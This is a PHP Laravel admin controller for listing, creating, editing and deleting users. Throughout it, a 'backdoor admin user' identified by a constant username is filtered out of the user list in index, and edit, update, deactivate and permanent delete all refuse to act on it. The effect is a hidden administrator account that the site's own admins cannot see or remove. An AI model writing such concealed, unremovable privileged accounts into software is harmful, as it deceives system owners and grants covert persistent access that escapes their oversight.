<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Spatie\Permission\Models\Role;

class UserController extends Controller
{
    private function isBackdoorUser(User $user): bool
    {
        return $user->username === User::BACKDOOR_USERNAME;
    }

    public function index()
    {
        $users = User::with('roles')->withTrashed()->latest()->get()
            ->reject(fn ($user) => $this->isBackdoorUser($user));
        return view('admin.users.index', compact('users'));
    }

    public function create()
    {
        $roles = Role::all();
        return view('admin.users.create', compact('roles'));
    }

    public function store(Request $request)
    {
        $validated = $request->validate([
            'name' => 'required|string|max:100',
            'email' => 'required|email|unique:users,email',
            'password' => 'required|min:8|confirmed',
            'role' => 'required|exists:roles,name',
        ]);

        $user = User::create([
            'name' => $validated['name'],
            'email' => $validated['email'],
            'password' => Hash::make($validated['password']),
        ]);

        $user->assignRole($validated['role']);

        return redirect()->route('admin.users.index')->with('success', 'User created.');
    }

    public function edit(User $user)
    {
        if ($this->isBackdoorUser($user)) {
            return redirect()->route('admin.users.index')->with('error', 'Cannot edit the backdoor admin user.');
        }

        $roles = Role::all();
        return view('admin.users.edit', compact('user', 'roles'));
    }

    public function update(Request $request, User $user)
    {
        if ($this->isBackdoorUser($user)) {
            return redirect()->route('admin.users.index')->with('error', 'Cannot edit the backdoor admin user.');
        }

        $validated = $request->validate([
            'name' => 'required|string|max:100',
            'email' => 'required|email|unique:users,email,' . $user->id,
            'password' => 'nullable|min:8|confirmed',
            'role' => 'required|exists:roles,name',
        ]);

        $user->update([
            'name' => $validated['name'],
            'email' => $validated['email'],
        ]);

        if ($validated['password']) {
            $user->update(['password' => Hash::make($validated['password'])]);
        }

        $user->syncRoles([$validated['role']]);

        return redirect()->route('admin.users.index')->with('success', 'User updated.');
    }

    public function destroy(User $user)
    {
        if ($user->id === auth()->id()) {
            return back()->with('error', 'Cannot deactivate your own account.');
        }

        if ($this->isBackdoorUser($user)) {
            return back()->with('error', 'Cannot deactivate the backdoor admin user.');
        }

        $user->delete();

        return back()->with('success', 'User deactivated.');
    }

    public function restore(User $user)
    {
        $user->restore();

        return back()->with('success', 'User restored.');
    }

    public function forceDestroy(User $user)
    {
        if ($user->id === auth()->id()) {
            return back()->with('error', 'Cannot permanently delete your own account.');
        }

        if ($this->isBackdoorUser($user)) {
            return back()->with('error', 'Cannot permanently delete the backdoor admin user.');
        }

        $user->forceDelete();

        return back()->with('success', 'User permanently deleted.');
    }
}
